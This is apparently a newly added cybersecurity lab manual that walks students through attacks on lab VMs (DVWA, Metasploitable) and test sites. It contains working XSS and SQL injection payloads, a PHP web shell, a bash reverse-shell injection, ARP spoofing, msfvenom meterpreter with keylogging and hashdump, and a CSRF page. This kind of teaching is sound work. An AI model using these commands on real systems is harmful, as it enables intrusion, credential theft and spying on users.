@@ -1,0 +1,1432 @@
+================================================================================
+                  ADVANCED CYBER SECURITY LABORATORY MANUAL
+================================================================================
+
+================================================================================
+EXPERIMENT 1: PASSWORD CRACKING WITH HASHCAT
+================================================================================
+
+PREREQUISITES:
+- Hashcat installed on Ubuntu/Kali Linux or Windows
+- Basic knowledge of hashing and cryptography
+- Text editor for creating test files
+
+--------------------------------------------------------------------------------
+LAB SETUP
+--------------------------------------------------------------------------------
+
+Install Hashcat on Ubuntu/Kali Linux:
+
+sudo apt update
+sudo apt install hashcat
+hashcat --help
+
+Prepare System - Create lab directory:
+
+mkdir ~/hashcat-lab
+cd ~/hashcat-lab
+
+Create Hash File:
+
+nano hashes.txt
+
+Add these sample MD5 hashes (press Ctrl+X, Y, Enter to save):
+
+5f4dcc3b5aa765d61d8327deb882cf99
+e10adc3949ba59abbe56e057f20f883e
+098f6bcd4621d373cade4e832627b4f6
+
+--------------------------------------------------------------------------------
+PART 1: DICTIONARY ATTACK ON MD5 HASHES
+--------------------------------------------------------------------------------
+
+STEP 1: Locate or prepare dictionary file
+
+On Kali Linux, extract rockyou.txt:
+
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+STEP 2: Run Hashcat with dictionary attack
+
+hashcat -m 0 -a 0 -o cracked_passwords.txt hashes.txt /usr/share/wordlists/rockyou.txt
+
+Command breakdown:
+-m 0 = MD5 hash type
+-a 0 = Dictionary attack mode
+-o cracked_passwords.txt = Output file for cracked passwords
+hashes.txt = Input file with hashes
+/usr/share/wordlists/rockyou.txt = Dictionary file path
+
+STEP 3: View results
+
+cat cracked_passwords.txt
+
+--------------------------------------------------------------------------------
+PART 2: BRUTE-FORCE ATTACK ON SHA-256 HASH
+--------------------------------------------------------------------------------
+
+STEP 1: Generate a SHA-256 hash
+
+echo -n "hello" | sha256sum
+
+Copy the hash output and add it to a new file:
+
+echo "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824" > sha256hash.txt
+
+STEP 2: Run brute-force attack
+
+hashcat -m 1400 -a 3 -o sha256_cracked.txt sha256hash.txt ?l?l?l?l?l
+
+Command breakdown:
+-m 1400 = SHA-256 hash type
+-a 3 = Brute-force attack mode
+?l?l?l?l?l = Mask for 5 lowercase letters
+
+Other useful masks:
+?l = lowercase letters (a-z)
+?u = uppercase letters (A-Z)
+?d = digits (0-9)
+?a = all ASCII printable characters
+
+Example for 4 characters (any ASCII):
+
+hashcat -m 1400 -a 3 -o sha256_cracked.txt sha256hash.txt ?a?a?a?a
+
+STEP 3: View results
+
+cat sha256_cracked.txt
+
+--------------------------------------------------------------------------------
+PART 3: RULES-BASED ATTACK
+--------------------------------------------------------------------------------
+
+STEP 1: Run Hashcat with rules
+
+hashcat -m 0 -a 0 -r /usr/share/hashcat/rules/best64.rule -o cracked_with_rules.txt hashes.txt /usr/share/wordlists/rockyou.txt
+
+Command breakdown:
+-r /usr/share/hashcat/rules/best64.rule = Apply transformation rules
+
+STEP 2: View results
+
+cat cracked_with_rules.txt
+
+
+================================================================================
+EXPERIMENT 2: CROSS-SITE SCRIPTING (XSS) WITH DVWA
+================================================================================
+
+PREREQUISITES:
+- DVWA installed on Metasploitable VM
+- Kali Linux on same network
+- Basic HTML and JavaScript knowledge
+
+--------------------------------------------------------------------------------
+LAB SETUP
+--------------------------------------------------------------------------------
+
+STEP 1: Start Metasploitable VM
+
+Boot Metasploitable 2 in VirtualBox/VMware
+Login credentials: msfadmin/msfadmin
+
+Check IP address:
+
+ifconfig
+
+Note the IP address (example: 192.168.1.100)
+
+STEP 2: Configure network
+
+Set both Kali and Metasploitable to NAT Network or Host-Only Adapter
+
+Verify connectivity from Kali:
+
+ping 192.168.1.100
+
+STEP 3: Access DVWA from Kali Linux
+
+Open Firefox on Kali and navigate to:
+
+http://192.168.1.100/dvwa
+
+Login credentials:
+Username: admin
+Password: password
+
+STEP 4: Set security level to Low
+
+Click "DVWA Security" in left sidebar
+Set to "Low"
+Click "Submit"
+
+--------------------------------------------------------------------------------
+PART 1: REFLECTED XSS ATTACK
+--------------------------------------------------------------------------------
+
+STEP 1: Navigate to XSS (Reflected)
+
+Click "XSS (Reflected)" in the left sidebar
+
+STEP 2: Test basic XSS payload
+
+In the input field, enter exactly:
+
+<script>alert("XSS Attack!");</script>
+
+Click "Submit" - Alert box will pop up
+
+STEP 3: Test cookie stealing payload
+
+In the input field, enter exactly:
+
+<script>alert(document.cookie);</script>
+
+Click "Submit" - Your session cookie will be displayed
+
+STEP 4: Additional payloads to try
+
+Display domain:
+
+<script>alert(document.domain);</script>
+
+Redirect to another site:
+
+<script>window.location="http://evil.com";</script>
+
+--------------------------------------------------------------------------------
+PART 2: STORED XSS ATTACK
+--------------------------------------------------------------------------------
+
+STEP 1: Navigate to XSS (Stored)
+
+Click "XSS (Stored)" in the left sidebar
+
+STEP 2: Enter malicious payload
+
+In the "Name" field, enter:
+
+TestUser
+
+In the "Message" field, enter exactly:
+
+<script>alert("Stored XSS");</script>
+
+STEP 3: Submit and test persistence
+
+Click "Sign Guestbook" - Alert appears immediately
+Refresh the page - Alert appears again (stored in database)
+
+STEP 4: Try more dangerous payload
+
+Clear previous entries, then in "Message" field enter:
+
+<script>document.body.innerHTML="<h1>HACKED!</h1>";</script>
+
+Click "Sign Guestbook" - Page content replaced
+
+--------------------------------------------------------------------------------
+FURTHER TESTING
+--------------------------------------------------------------------------------
+
+Test with Medium security:
+
+Go to "DVWA Security"
+Set to "Medium"
+
+Try bypassing with:
+
+<SCRIPT>alert("XSS");</SCRIPT>
+
+Or:
+
+<img src=x onerror="alert('XSS')">
+
+
+================================================================================
+EXPERIMENT 3: FILE UPLOAD VULNERABILITIES WITH DVWA
+================================================================================
+
+PREREQUISITES:
+- DVWA installed and configured
+- Basic PHP knowledge
+
+--------------------------------------------------------------------------------
+LAB SETUP
+--------------------------------------------------------------------------------
+
+STEP 1: Set security to Low
+
+DVWA Security → Set to "Low" → Submit
+
+STEP 2: Navigate to File Upload
+
+Click "Upload" in the left sidebar
+
+--------------------------------------------------------------------------------
+PART 1: TESTING FILE UPLOAD VULNERABILITY
+--------------------------------------------------------------------------------
+
+STEP 1: Test with legitimate image
+
+Upload a harmless image (e.g., a .jpg or .png)
+Note the upload path shown (example: /dvwa/hackable/uploads/test.jpg)
+
+STEP 2: Create malicious PHP file
+
+On Kali Linux:
+
+nano test.php
+
+Add this content:
+
+<?php echo "Hello from your PHP file!"; ?>
+
+Save (Ctrl+X, Y, Enter)
+
+STEP 3: Upload PHP file
+
+In DVWA:
+Click "Browse"
+Select test.php
+Click "Upload"
+
+STEP 4: Access uploaded PHP file
+
+In browser, navigate to:
+
+http://192.168.1.100/dvwa/hackable/uploads/test.php
+
+You should see: "Hello from your PHP file!"
+
+STEP 5: Create web shell PHP file
+
+nano shell.php
+
+Add this content:
+
+<?php system($_GET['cmd']); ?>
+
+Save and upload this file
+
+STEP 6: Execute system commands
+
+Navigate to:
+
+http://192.168.1.100/dvwa/hackable/uploads/shell.php?cmd=whoami
+
+Try other commands:
+
+http://192.168.1.100/dvwa/hackable/uploads/shell.php?cmd=ls
+http://192.168.1.100/dvwa/hackable/uploads/shell.php?cmd=pwd
+http://192.168.1.100/dvwa/hackable/uploads/shell.php?cmd=cat%20/etc/passwd
+
+--------------------------------------------------------------------------------
+PART 2: BYPASSING SECURITY FILTERS
+--------------------------------------------------------------------------------
+
+STEP 1: Set security to Medium
+
+DVWA Security → Set to "Medium" → Submit
+
+STEP 2: Try double extension bypass
+
+Rename your PHP file:
+
+cp shell.php shell.php.jpg
+
+Upload shell.php.jpg and test if it executes
+
+STEP 3: Try different extensions
+
+Create files with these names:
+- shell.php5
+- shell.phtml
+- shell.phar
+
+Upload and test each
+
+STEP 4: Set security to High
+
+DVWA Security → Set to "High" → Submit
+Observe how validation becomes stricter
+
+
+================================================================================
+EXPERIMENT 4: COMMAND INJECTION WITH DVWA
+================================================================================
+
+PREREQUISITES:
+- DVWA on Metasploitable with security set to Low
+- Basic Linux command knowledge
+
+--------------------------------------------------------------------------------
+LAB SETUP
+--------------------------------------------------------------------------------
+
+STEP 1: Set DVWA security to Low
+
+DVWA Security → Set to "Low" → Submit
+
+STEP 2: Navigate to Command Injection
+
+Click "Command Injection" in the left sidebar
+
+--------------------------------------------------------------------------------
+EXPERIMENT STEPS
+--------------------------------------------------------------------------------
+
+STEP 1: Test normal functionality
+
+In the input field, enter your Metasploitable IP:
+
+192.168.1.100
+
+Click "Submit" - See normal ping output
+
+STEP 2: Test command injection with semicolon
+
+In the input field, enter:
+
+192.168.1.100;ls
+
+Click "Submit" - See ping output PLUS directory listing
+
+STEP 3: View password file
+
+In the input field, enter:
+
+192.168.1.100;cat /etc/passwd
+
+Click "Submit" - See user accounts
+
+STEP 4: Check current user
+
+In the input field, enter:
+
+192.168.1.100;whoami
+
+Click "Submit" - See which user is running the web server
+
+STEP 5: List running processes
+
+In the input field, enter:
+
+192.168.1.100;ps aux
+
+Click "Submit" - See all running processes
+
+STEP 6: Get system information
+
+In the input field, enter:
+
+192.168.1.100;uname -a
+
+Click "Submit" - See kernel and OS details
+
+STEP 7: Test with AND operator
+
+In the input field, enter:
+
+192.168.1.100 && whoami
+
+Click "Submit" - Executes if first command succeeds
+
+STEP 8: Test with OR operator
+
+In the input field, enter:
+
+192.168.1.100 || whoami
+
+Click "Submit" - Executes if first command fails
+
+STEP 9: Test with pipe operator
+
+In the input field, enter:
+
+192.168.1.100 | whoami
+
+Click "Submit" - Pipes output to second command
+
+--------------------------------------------------------------------------------
+ADVANCED: REVERSE SHELL
+--------------------------------------------------------------------------------
+
+STEP 1: Start listener on Kali Linux
+
+Open terminal on Kali:
+
+nc -lvnp 4444
+
+STEP 2: Get Kali IP address
+
+In another Kali terminal:
+
+ip addr show
+
+Note your IP (example: 192.168.1.50)
+
+STEP 3: Execute reverse shell command
+
+In DVWA Command Injection input field, enter (replace 192.168.1.50 with YOUR Kali IP):
+
+192.168.1.100;bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
+
+Click "Submit"
+
+STEP 4: Check your netcat listener
+
+You should now have a shell on the Metasploitable machine
+
+
+================================================================================
+EXPERIMENT 5: MAN-IN-THE-MIDDLE ATTACK WITH ETTERCAP
+================================================================================
+
+PREREQUISITES:
+- Kali Linux with Ettercap and Wireshark installed
+- Target Windows or Metasploitable VM on same network
+- Know target IP and gateway IP
+
+--------------------------------------------------------------------------------
+METHOD 1: AUTOMATIC ATTACK WITH ETTERCAP GUI
+--------------------------------------------------------------------------------
+
+STEP 1: Find target and gateway IPs
+
+On Kali Linux:
+
+ip addr show
+ip route | grep default
+
+Note gateway IP (example: 192.168.1.1)
+On target machine, find its IP (example: 192.168.1.105)
+
+STEP 2: Open Ettercap on Kali
+
+sudo ettercap -G
+
+STEP 3: Configure sniffing
+
+- Click the checkmark icon at top to open "Sniff" menu
+- Select "Unified sniffing"
+- Choose network interface (usually eth0)
+- Click OK
+
+STEP 4: Scan for hosts
+
+- Click "Hosts" menu
+- Select "Scan for hosts"
+- Wait for scan to complete
+
+STEP 5: View host list
+
+- Click "Hosts" menu
+- Select "Hosts list"
+- You'll see all devices on network with IPs and MACs
+
+STEP 6: Set up ARP poisoning
+
+- In Hosts list, click on your target IP (192.168.1.105)
+- Click "Add to Target 1"
+- Click on your gateway IP (192.168.1.1)
+- Click "Add to Target 2"
+
+STEP 7: Start MITM attack
+
+- Click "Mitm" menu
+- Select "ARP poisoning"
+- Check "Sniff remote connections"
+- Click "OK"
+
+STEP 8: Start sniffing
+
+- Click "Start" menu
+- Select "Start sniffing"
+
+STEP 9: Test the attack
+
+On target machine:
+- Open browser
+- Navigate to: http://testphp.vulnweb.com/login.php
+- Enter username: test and password: test
+- Click Login
+
+STEP 10: View captured credentials
+
+In Ettercap on Kali, check the message window at bottom
+
+You'll see:
+USER: test  PASS: test  INFO: http://testphp.vulnweb.com/login.php
+
+--------------------------------------------------------------------------------
+METHOD 2: MANUAL ATTACK WITH ARPSPOOF
+--------------------------------------------------------------------------------
+
+STEP 1: Enable IP forwarding
+
+Open terminal on Kali:
+
+sudo su
+echo 1 > /proc/sys/net/ipv4/ip_forward
+cat /proc/sys/net/ipv4/ip_forward
+
+Output should be: 1
+
+STEP 2: Optional - Redirect HTTP traffic
+
+If using SSLStrip or similar tool:
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+STEP 3: Poison target's ARP cache
+
+Open a new terminal (Terminal 1):
+
+sudo arpspoof -i eth0 -t 192.168.1.105 192.168.1.1
+
+This tells the target that YOU are the gateway
+
+STEP 4: Poison gateway's ARP cache
+
+Open another terminal (Terminal 2):
+
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.105
+
+This tells the gateway that YOU are the target
+
+STEP 5: Start Wireshark
+
+Open a new terminal (Terminal 3):
+
+sudo wireshark
+
+- Select your network interface (eth0)
+- Click the shark fin icon to start capture
+
+STEP 6: Generate traffic on target
+
+On target machine:
+- Open browser
+- Navigate to: http://testphp.vulnweb.com/login.php
+- Enter credentials and login
+
+STEP 7: Analyze captured traffic in Wireshark
+
+Stop capture (red square icon)
+
+Apply display filter:
+
+http.request.method == POST
+
+Find the login POST request
+Right-click → Follow → HTTP Stream
+You'll see plaintext credentials in the HTML form data
+
+STEP 8: Clean up
+
+Press Ctrl+C in both arpspoof terminal windows
+
+Disable IP forwarding:
+
+echo 0 > /proc/sys/net/ipv4/ip_forward
+
+
+================================================================================
+EXPERIMENT 6: DATA ACQUISITION WITH METASPLOIT
+================================================================================
+
+PREREQUISITES:
+- Kali Linux with Metasploit Framework
+- Windows VM as target
+- Both VMs on NAT or Host-Only network
+
+--------------------------------------------------------------------------------
+LAB STEPS
+--------------------------------------------------------------------------------
+
+STEP 1: Find your Kali IP address
+
+ip addr show
+
+Note your IP (example: 192.168.1.50)
+
+STEP 2: Create malicious payload
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell_reverse.exe
+
+Command breakdown:
+-p windows/meterpreter/reverse_tcp = Payload type
+LHOST=192.168.1.50 = YOUR Kali IP (REPLACE THIS)
+LPORT=4444 = Port to listen on
+-f exe = Output format (Windows executable)
+-o shell_reverse.exe = Output filename
+
+STEP 3: Start HTTP server to serve payload
+
+python3 -m http.server 9090
+
+Keep this terminal open
+
+STEP 4: Set up Metasploit listener
+
+Open a new terminal:
+
+msfconsole
+
+Wait for Metasploit to load, then enter these commands one by one:
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+set LPORT 4444
+exploit
+
+You'll see: Started reverse TCP handler on 192.168.1.50:4444
+
+STEP 5: Download and execute payload on target
+
+On Windows VM:
+- Open browser
+- Navigate to: http://192.168.1.50:9090
+- Click on shell_reverse.exe to download
+- Navigate to Downloads folder
+- Double-click shell_reverse.exe to run
+
+STEP 6: Verify Meterpreter session
+
+Back on Kali in msfconsole, you should see:
+Meterpreter session 1 opened
+
+Your prompt changes to: meterpreter >
+
+STEP 7: Gather system information
+
+sysinfo
+
+Shows OS, architecture, computer name, etc.
+
+STEP 8: Start keylogger
+
+keyscan_start
+
+STEP 9: Type something on target machine
+
+On Windows VM, open Notepad and type some text
+
+STEP 10: Dump captured keystrokes
+
+Back in Meterpreter:
+
+keyscan_dump
+
+You'll see everything typed
+
+STEP 11: List files in current directory
+
+ls
+
+STEP 12: Navigate to user desktop
+
+cd C:\\Users\\YourUsername\\Desktop
+ls
+
+Replace YourUsername with actual Windows username
+
+STEP 13: Download a file
+
+download C:\\Users\\YourUsername\\Desktop\\somefile.txt
+
+File will be saved to your current directory on Kali
+
+STEP 14: Take screenshot
+
+screenshot
+
+Screenshot saved to Kali
+
+STEP 15: Dump password hashes
+
+hashdump
+
+Shows NTLM password hashes for all users
+
+STEP 16: Get current user
+
+getuid
+
+STEP 17: Background the session
+
+background
+
+Returns to msf6 > prompt
+
+STEP 18: List sessions
+
+sessions -l
+
+STEP 19: Return to session
+
+sessions -i 1
+
+STEP 20: Exit and clean up
+
+exit
+
+On Windows VM, delete the malware file
+
+
+================================================================================
+EXPERIMENT 7: BRUTE FORCE ATTACK WITH BURP SUITE
+================================================================================
+
+PREREQUISITES:
+- DVWA installed (security level Low)
+- Burp Suite installed on Kali
+- Firefox configured to use Burp proxy
+
+--------------------------------------------------------------------------------
+LAB SETUP
+--------------------------------------------------------------------------------
+
+STEP 1: Configure Firefox proxy
+
+On Kali Linux:
+- Open Firefox
+- Menu → Settings → Search for "proxy"
+- Click "Settings" button under Network Settings
+- Select "Manual proxy configuration"
+- HTTP Proxy: 127.0.0.1 Port: 8080
+- Check "Also use this proxy for HTTPS"
+- Click OK
+
+STEP 2: Start Burp Suite
+
+burpsuite
+
+Wait for Burp to load
+
+STEP 3: Enable intercept
+
+In Burp Suite:
+- Click "Proxy" tab
+- Click "Intercept" sub-tab
+- Ensure button says "Intercept is on"
+
+--------------------------------------------------------------------------------
+EXPERIMENT STEPS
+--------------------------------------------------------------------------------
+
+STEP 1: Access DVWA Brute Force module
+
+In Firefox, navigate to:
+
+http://192.168.1.100/dvwa
+
+Login with admin/password, then click "Brute Force" in sidebar
+
+STEP 2: Attempt login with wrong credentials
+
+In DVWA:
+- Username: admin
+- Password: wrongpass
+- Click "Login"
+
+STEP 3: Capture request in Burp
+
+Request will be intercepted in Burp Suite
+
+You'll see the GET request with parameters:
+GET /dvwa/vulnerabilities/brute/?username=admin&password=wrongpass&Login=Login HTTP/1.1
+
+STEP 4: Send to Intruder
+
+Right-click anywhere in the request → "Send to Intruder"
+
+STEP 5: Configure attack positions
+
+Click "Intruder" tab → "Positions" sub-tab
+
+Click "Clear §" button to remove all markers
+
+Manually highlight the value after username= (the word admin)
+Click "Add §" button
+
+The line should now look like:
+username=§admin§
+
+Highlight the value after password= (the word wrongpass)
+Click "Add §" button
+
+The line should now look like:
+password=§wrongpass§
+
+STEP 6: Set attack type
+
+At the top of Positions tab, set Attack type to: "Cluster bomb"
+
+STEP 7: Configure username payloads
+
+Click "Payloads" tab
+
+Payload set: Select "1" from dropdown
+
+Under "Payload settings [Simple list]":
+- Type: admin and click "Add"
+- Type: user and click "Add"
+- Type: test and click "Add"
+
+STEP 8: Configure password payloads
+
+Payload set: Select "2" from dropdown
+
+Under "Payload settings [Simple list]":
+- Type: password and click "Add"
+- Type: 123456 and click "Add"
+- Type: admin and click "Add"
+- Type: letmein and click "Add"
+- Type: test and click "Add"
+
+STEP 9: Start attack
+
+Click "Start attack" button (top right)
+
+A new window opens showing attack progress
+
+STEP 10: Analyze results
+
+In the results window, look at the "Length" column
+
+Most failed attempts will have similar length (example: 4589)
+
+Successful login will have DIFFERENT length (example: 4623)
+
+Click on the row with different length → View the response
+
+You'll see: "Welcome to the password protected area admin"
+
+That combination is the correct credentials
+
+STEP 11: Verify credentials
+
+Turn off intercept in Burp: "Intercept is off"
+
+In Firefox, go back to DVWA Brute Force page
+
+Enter the discovered credentials and verify they work
+
+STEP 12: Clean up
+
+In Firefox:
+- Menu → Settings → Network Settings
+- Select "No proxy"
+- Click OK
+
+
+================================================================================
+EXPERIMENT 8: SQL INJECTION WITH DVWA AND SQLMAP
+================================================================================
+
+PREREQUISITES:
+- DVWA installed (security level Low)
+- sqlmap installed on Kali Linux
+
+--------------------------------------------------------------------------------
+PART 1: MANUAL SQL INJECTION ON DVWA
+--------------------------------------------------------------------------------
+
+STEP 1: Access SQL Injection module
+
+Navigate to:
+
+http://192.168.1.100/dvwa
+
+Login, then click "SQL Injection" in sidebar
+
+STEP 2: Test for vulnerability
+
+In the "User ID" field, enter:
+
+'
+
+Click "Submit"
+
+If you see an error like: "You have an error in your SQL syntax", it's vulnerable
+
+STEP 3: Bypass authentication
+
+In the "User ID" field, enter:
+
+' OR '1'='1
+
+Click "Submit"
+
+You'll see ALL users returned instead of just one
+
+STEP 4: Determine number of columns
+
+In the "User ID" field, test with ORDER BY:
+
+1' ORDER BY 1--
+
+Click Submit → No error
+
+1' ORDER BY 2--
+
+Click Submit → No error
+
+1' ORDER BY 3--
+
+Click Submit → Error appears
+
+This means there are 2 columns
+
+STEP 5: Extract database name
+
+In the "User ID" field, enter:
+
+-1' UNION SELECT database(),2--
+
+Click "Submit"
+
+You'll see the database name (example: dvwa)
+
+STEP 6: Extract database version
+
+In the "User ID" field, enter:
+
+-1' UNION SELECT version(),2--
+
+Click "Submit"
+
+Shows MySQL version
+
+STEP 7: Extract all database names
+
+In the "User ID" field, enter:
+
+-1' UNION SELECT schema_name,2 FROM information_schema.schemata--
+
+Click "Submit" → You'll see all database names
+
+STEP 8: Extract table names
+
+In the "User ID" field, enter:
+
+-1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema='dvwa'--
+
+Click "Submit" → Shows tables like users, guestbook
+
+STEP 9: Extract column names from users table
+
+In the "User ID" field, enter:
+
+-1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--
+
+Click "Submit" → Shows columns: user_id, first_name, last_name, user, password, etc.
+
+STEP 10: Extract user credentials
+
+In the "User ID" field, enter:
+
+-1' UNION SELECT user,password FROM users--
+
+Click "Submit" → Shows all usernames and password hashes
+
+--------------------------------------------------------------------------------
+PART 2: AUTOMATED SQL INJECTION WITH SQLMAP
+--------------------------------------------------------------------------------
+
+STEP 1: Find vulnerable URL
+
+In DVWA SQL Injection module, enter 1 and click Submit
+
+Copy the URL from address bar:
+
+http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
+
+STEP 2: Get session cookie
+
+In Firefox on the DVWA page:
+- Press F12 to open Developer Tools
+- Click "Storage" tab
+- Click "Cookies"
+- Find cookie named PHPSESSID
+- Copy its value (example: abcd1234efgh5678)
+
+STEP 3: List databases with sqlmap
+
+Open terminal on Kali:
+
+sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=abcd1234efgh5678; security=low" --dbs
+
+Press Enter when prompted, then Y to continue
+
+Output shows available databases:
+[*] dvwa
+[*] information_schema
+[*] mysql
+
+STEP 4: List tables in dvwa database
+
+sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=abcd1234efgh5678; security=low" -D dvwa --tables
+
+Output shows tables:
+[*] guestbook
+[*] users
+
+STEP 5: List columns in users table
+
+sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=abcd1234efgh5678; security=low" -D dvwa -T users --columns
+
+Shows all column names
+
+STEP 6: Dump users table data
+
+sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=abcd1234efgh5678; security=low" -D dvwa -T users --dump
+
+Displays all usernames and password hashes in a formatted table
+
+--------------------------------------------------------------------------------
+PART 3: SQL INJECTION ON EXTERNAL VULNERABLE SITE
+--------------------------------------------------------------------------------
+
+STEP 1: Test with public vulnerable site
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
+
+Press Y when prompted
+
+STEP 2: List tables
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables
+
+STEP 3: Dump specific table
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump
+
+
+================================================================================
+EXPERIMENT 9: EXPLOITING VULNERABLE SERVICES WITH METASPLOIT
+================================================================================
+
+PREREQUISITES:
+- Kali Linux with nmap and Metasploit
+- Metasploitable VM
+- Both VMs on same network
+
+--------------------------------------------------------------------------------
+LAB STEPS
+--------------------------------------------------------------------------------
+
+STEP 1: Find Metasploitable IP
+
+On Metasploitable VM, login (msfadmin/msfadmin) and run:
+
+ifconfig
+
+Note the IP (example: 192.168.1.100)
+
+STEP 2: Scan for services from Kali
+
+nmap -sV -A 192.168.1.100
+
+Review output for vulnerable services. Look for:
+21/tcp   open  ftp         vsftpd 2.3.4
+
+STEP 3: Start Metasploit
+
+msfconsole
+
+Wait for banner and prompt: msf6 >
+
+STEP 4: Search for vsftpd exploit
+
+search vsftpd
+
+Output shows:
+exploit/unix/ftp/vsftpd_234_backdoor
+
+STEP 5: Select the exploit
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+Prompt changes to: msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
+
+STEP 6: Show exploit options
+
+show options
+
+Look at required options
+
+STEP 7: Set target host
+
+set RHOST 192.168.1.100
+
+STEP 8: Run the exploit
+
+exploit
+
+or
+
+run
+
+STEP 9: Verify shell access
+
+If successful, you'll see:
+Command shell session 1 opened
+
+Prompt changes to just a blank line or $
+
+STEP 10: Execute commands
+
+whoami
+
+Output: root
+
+id
+
+Shows you're root
+
+ls
+
+Lists files
+
+cat /etc/passwd
+
+Shows user accounts
+
+ifconfig
+
+Shows network configuration
+
+ps aux
+
+Shows all processes
+
+STEP 11: Background the session
+
+background
+
+or press Ctrl+Z
+
+STEP 12: List sessions
+
+Back at msf6 > prompt:
+
+sessions -l
+
+Shows all active sessions
+
+STEP 13: Return to session
+
+sessions -i 1
+
+STEP 14: Exit
+
+exit
+
+
+================================================================================
+EXPERIMENT 10: CSRF WITH DVWA
+================================================================================
+
+PREREQUISITES:
+- DVWA installed (security level Low)
+- Victim must be authenticated in DVWA
+
+--------------------------------------------------------------------------------
+STEP-BY-STEP PROCESS
+--------------------------------------------------------------------------------
+
+STEP 1: Navigate to CSRF Section
+
+In DVWA, go to the "CSRF" module (Change your admin password page)
+
+STEP 2: Perform a Legitimate Action
+
+Change the password on the DVWA CSRF page to observe the legitimate request
+
+The URL will show the parameters passed, something like:
+
+http://192.168.1.100/dvwa/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change
+
+STEP 3: Craft the Malicious Request (Attacker - Kali Linux)
+
+Create an HTML file on Kali Linux:
+
+nano csrf_demo.html
+
+Add this content (replace 192.168.1.100 with your Metasploitable IP):
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Prize!</title>
+</head>
+<body>
+    <h1>Congratulations! Click here to claim your prize!</h1>
+    <form action="http://192.168.1.100/dvwa/vulnerabilities/csrf/" method="GET" id="csrfForm">
+        <input type="hidden" name="password_new" value="newpassword123">
+        <input type="hidden" name="password_conf" value="newpassword123">
+        <input type="hidden" name="Change" value="Change">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
+
+Save (Ctrl+X, Y, Enter)
+
+STEP 4: Host the malicious HTML file
+
+On Kali Linux:
+
+python3 -m http.server 8000
+
+STEP 5: Execute the Attack (Simulated Victim Action)
+
+On a browser where you're logged into DVWA, navigate to:
+
+http://192.168.1.50:8000/csrf_demo.html
+
+(Replace 192.168.1.50 with your Kali IP)
+
+The form will auto-submit and change the password
+
+STEP 6: Verify the CSRF Attack
+
+Try to log in to DVWA with the new password:
+
+Username: admin
+Password: newpassword123
+
+Login should succeed, confirming the password was changed via CSRF
+
+--------------------------------------------------------------------------------
+MITIGATION STRATEGIES
+--------------------------------------------------------------------------------
+
+1. Use Anti-CSRF Tokens
+   Implement unique, secret, and unpredictable tokens in all state-changing requests
+
+2. SameSite Cookies
+   Use SameSite cookie attributes (e.g., Strict or Lax)
+
+3. Referer/Origin Validation
+   Check the HTTP Referer or Origin header to ensure the request is coming from the application's domain
+
+
+================================================================================
+ADDITIONAL NOTES AND REMINDERS
+================================================================================
+
+GENERAL SAFETY REMINDERS:
+- All experiments should be conducted in isolated lab environments only
+- Never perform these attacks on systems you don't own or have explicit permission to test
+- Always restore VMs to clean snapshots after experiments
+- Document all findings and observations
+- Disable any backdoors or shells after completing experiments
+
+COMMON TROUBLESHOOTING:
+
+Network Connectivity Issues:
+- Ensure all VMs are on the same network (NAT Network or Host-Only)
+- Check firewall settings on both attacker and target machines
+- Verify IP addresses with: ip addr show (Linux) or ipconfig (Windows)
+- Test connectivity with: ping [target_ip]
+
+DVWA Issues:
+- If DVWA won't load, restart Apache: sudo service apache2 restart
+- If database errors occur, reset DVWA database from setup page
+- Default credentials: admin/password
+- Check security level is set correctly for each experiment
+
+Metasploit Issues:
+- If exploits fail, verify RHOST and LHOST are set correctly
+- Check that target service is actually running: nmap -p [port] [target_ip]
+- Try running exploit with: exploit -j (runs in background)
+- Clear sessions if needed: sessions -K
+
+Burp Suite Issues:
+- If proxy not working, verify Firefox proxy settings: 127.0.0.1:8080
+- Disable proxy when done with Burp Suite experiments
+- If Intruder attack doesn't start, check that payloads are configured
+- Community Edition has rate limiting on Intruder
+
+IP ADDRESS PLACEHOLDERS USED IN THIS MANUAL:
+Throughout this manual, the following example IP addresses are used:
+- 192.168.1.50 = Kali Linux (Attacker) - REPLACE WITH YOUR KALI IP
+- 192.168.1.100 = Metasploitable (Target) - REPLACE WITH YOUR METASPLOITABLE IP
+- 192.168.1.105 = Windows Target - REPLACE WITH YOUR WINDOWS VM IP
+- 192.168.1.1 = Gateway/Router - REPLACE WITH YOUR ACTUAL GATEWAY IP
+
+Always replace these with your actual IP addresses obtained from:
+- Linux: ip addr show or ifconfig
+- Windows: ipconfig
+- Gateway: ip route | grep default (Linux) or route print (Windows)
+
+RECOMMENDED LAB ENVIRONMENT:
+- Hypervisor: VirtualBox or VMware
+- Attacker VM: Kali Linux (Latest version)
+- Target VMs: Metasploitable 2, Windows 7/10 VM
+- Network Configuration: NAT Network or Host-Only Adapter
+- RAM: At least 2GB per VM
+- Snapshots: Take clean snapshots before starting experiments
+
+USEFUL COMMANDS REFERENCE:
+
+Finding IP Addresses:
+ip addr show
+ifconfig
+ip route | grep default
+hostname -I
+
+Network Testing:
